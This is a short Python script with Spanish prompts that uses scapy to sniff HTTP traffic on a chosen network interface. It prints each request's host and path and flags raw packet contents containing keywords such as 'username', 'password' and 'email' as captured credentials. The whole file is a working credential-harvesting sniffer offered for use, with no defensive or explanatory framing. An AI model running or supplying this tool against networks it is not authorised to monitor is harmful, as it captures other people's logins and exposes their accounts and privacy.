#!/usr/bin/env python
import scapy.all as scapy
from scapy_http import http
import argparse

interface=raw_input("Introduce la interfaz por la que debe escuchar: ")


def pkt_proc(packet):
    if packet.haslayer(http.HTTPRequest):
        print("Archivos Http Request ---> "+ packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        if packet.haslayer(scapy.Raw):
            datos = packet[scapy.Raw].load
            campos = ["username", "password", "pass", "email"]
            for crede in campos:
                if crede in datos:
                    print("[*][*][*][*][*][*][*][*][*][*][*][*]")
                    print("Posible usuario y password "+datos)
                    print("[*][*][*][*][*][*][*][*][*][*][*][*]")
                    break




scapy.sniff(prn=pkt_proc, iface=interface, store=False)

                
